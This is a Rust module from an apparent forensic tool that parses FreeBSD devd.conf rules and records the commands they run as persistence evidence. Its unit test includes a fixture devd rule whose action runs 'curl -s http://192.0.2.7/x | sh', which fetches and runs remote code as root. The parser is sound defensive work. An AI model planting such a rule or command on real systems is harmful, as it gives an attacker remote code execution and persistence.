//! FreeBSD `devd` configuration: rules that run a command when a device or system event
//! matches. Format: devd.conf(5). A `notify`, `attach`, `detach` or `nomatch` block with an
//! `action "command";` runs that command as root, which is also a way to persist.

use crate::text::{for_each_line, lossy};
use crate::{Artifact, Category, Input, FREEBSD};
use nixcavate_core::{Loc, Record, Result, Sink};
use serde::Serialize;

pub const ARTIFACT: Artifact = Artifact::new(
    "devd-conf",
    "devd rules and the commands they run",
    Category::Persistence,
    FREEBSD,
    &["etc/devd.conf", "etc/devd/*.conf", "usr/local/etc/devd/*.conf"],
    parse,
);

#[derive(Serialize)]
struct Action<'a> {
    /// `notify`, `attach`, `detach` or `nomatch`.
    block: &'a str,
    /// The `match "variable" "value"` lines of the block, joined by `; `.
    matches: String,
    /// The command the action runs.
    command: &'a str,
}

impl Record for Action<'_> {}

/// The text between the first pair of double quotes of `rest`.
fn quoted(rest: &str) -> Option<&str> {
    let start = rest.find('"')? + 1;
    let end = start + rest[start..].find('"')?;
    Some(&rest[start..end])
}

fn parse(input: &Input, sink: &mut Sink) -> Result<()> {
    let mut block = String::new();
    let mut matches: Vec<String> = Vec::new();
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let t = text.trim();
        let word = t.split([' ', '\t', '{']).next().unwrap_or_default();
        if matches!(word, "notify" | "attach" | "detach" | "nomatch") && t.contains('{') {
            block = word.to_string();
            matches.clear();
        } else if let Some(rest) = t.strip_prefix("match ") {
            matches.push(rest.trim_end_matches(';').to_string());
        } else if let Some(rest) = t.strip_prefix("action ") {
            if let Some(command) = quoted(rest) {
                if !block.is_empty() {
                    let joined = matches.join("; ");
                    return sink.emit(Loc::Line(line.number), &Action { block: &block, matches: joined, command });
                }
            }
        } else if t.starts_with('}') {
            block.clear();
        }
        Ok(())
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::run;

    #[test]
    fn actions_with_their_blocks_and_matches() {
        let conf = b"options {\n\tpid-file \"/var/run/devd.pid\";\n};\nnotify 100 {\n\tmatch \"system\" \"NXMK\";\n\tmatch \"type\" \"x\";\n\taction \"logger -t nxmk hello; curl -s http://192.0.2.7/x | sh\";\n};\nattach 10 {\n\tdevice-name \"ugen[0-9]+\";\n\taction \"/usr/local/bin/hook $device-name\";\n};\nnomatch 0 {\n\tmatch \"bus\" \"uhub[0-9]+\";\n};\n";
        let out = run(&ARTIFACT, "etc/devd/nxmk.conf", conf, 0);
        insta::assert_snapshot!(out);
        assert_eq!(out.lines().count(), 2);
    }
}
